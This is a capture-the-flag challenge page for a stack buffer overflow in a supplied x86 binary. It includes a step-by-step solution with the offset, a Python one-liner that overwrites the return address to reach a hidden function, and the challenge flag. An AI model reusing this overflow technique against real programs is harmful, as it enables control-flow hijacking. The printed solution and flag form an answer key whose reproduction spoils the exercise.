# ♻ Memories - L13 C05

Agent 707, we've intercepted a file sent between two gang members and it's confused our agents. When you execute the program it will give you a memory address for a function. See if you can exploit the binary to run the function.

**Tip:** Use a cyclic pattern tool.

<details><summary>

## Need a hint?</summary>

> 💡 Hint: [http://www.anonhack.in/2022/03/the-binary-exploitation-stack-based-buffer-overflow/](http://www.anonhack.in/2022/03/the-binary-exploitation-stack-based-buffer-overflow/)

</details>

## Files

- [program-x86](/assets/memories1)

<details><summary>

## Step by Step</summary>

- Download the program onto a Linux machine
- The offset is 156 for the cyclical pattern tool
- `Run python -c "print('A'*156+'\xb1\x84\x04\x08')" | ./filename.exe`
- The flag should show up

`flag: 4UPzOlkhlUBvY8bHikd`

</details>
